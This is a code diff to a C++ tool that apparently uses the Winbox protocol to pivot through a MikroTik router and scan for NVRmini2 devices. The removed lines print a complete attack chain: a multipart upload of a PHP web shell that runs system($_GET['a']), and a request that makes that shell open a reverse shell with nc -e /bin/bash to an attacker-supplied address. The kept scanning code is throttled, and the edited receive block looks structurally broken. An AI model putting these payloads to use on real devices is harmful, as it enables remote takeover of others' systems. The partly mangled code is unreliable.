@@ -29,6 +29,7 @@
 */
 #include <cstdlib>
 #include <iostream>
+#include <unistd.h>
 #include <boost/cstdint.hpp>
 #include <boost/program_options.hpp>
 #include <boost/algorithm/string.hpp>
@@ -124,38 +125,8 @@ namespace
 
         if (!session.receive(msg))
         {
-            std::cerr << "Error receiving a response." << std::endl;
-            return false;
-        }
-
-        if (msg.has_error())
-        {
-            std::cerr << msg.get_error_string() << std::endl;
-            return false;
-        }
-
-        return msg.get_boolean(0xd);
-    }
-    
-    bool upload_webshell(Winbox_Session& session, boost::uint32_t p_converted_address,
-                         boost::uint32_t p_converted_port)
-    {
-        WinboxMessage msg;
-        msg.set_to(104);
-        msg.set_command(1);
-        msg.set_request_id(1);
-        msg.set_reply_expected(true);
-        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:a\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
-        msg.add_string(8, "200 OK");
-        msg.add_u32(3, p_converted_address);
-        msg.add_u32(4, p_converted_port);
-
-        session.send(msg);
-        msg.reset();
-
-        if (!session.receive(msg))
-        {
-            std::cerr << "Error receiving a response." << std::endl;
+            std::cerr << "[-] Connection lost. Attempting to reconnect..." << std::endl;
+            session.connect();
             return false;
         }
 
@@ -168,38 +139,6 @@ namespace
         return msg.get_boolean(0xd);
     }
 
-    bool execute_reverse_shell(Winbox_Session& session, boost::uint32_t p_converted_address,
-                               boost::uint32_t p_converted_port, std::string& p_reverse_ip,
-                               std::string& p_reverse_port)
-    {
-        WinboxMessage msg;
-        msg.set_to(104);
-        msg.set_command(1);
-        msg.set_request_id(1);
-        msg.set_reply_expected(true);
-        msg.add_string(7, "GET /a.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/bash)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
-        msg.add_string(8, "200 OK");
-        msg.add_u32(3, p_converted_address);
-        msg.add_u32(4, p_converted_port);
-
-        session.send(msg);
-        msg.reset();
-
-        if (!session.receive(msg))
-        {
-            std::cerr << "Error receiving a response." << std::endl;
-            return false;
-        }
-
-        if (msg.has_error())
-        {
-            std::cerr << msg.get_error_string() << std::endl;
-            return false;
-        }
-
-        return msg.get_boolean(0xd);
-    }
-}
 
 int main(int p_argc, const char** p_argv)
 {
@@ -247,6 +186,7 @@ int main(int p_argc, const char** p_argv)
             if (find_nvrmini2(winboxSession, current_target, converted_address, port)) {
                 std::cout << "[!] DISCOVERY: Service found at " << current_target << " on port " << port << std::endl;
             }
+            usleep(50000);
         }
     }
 
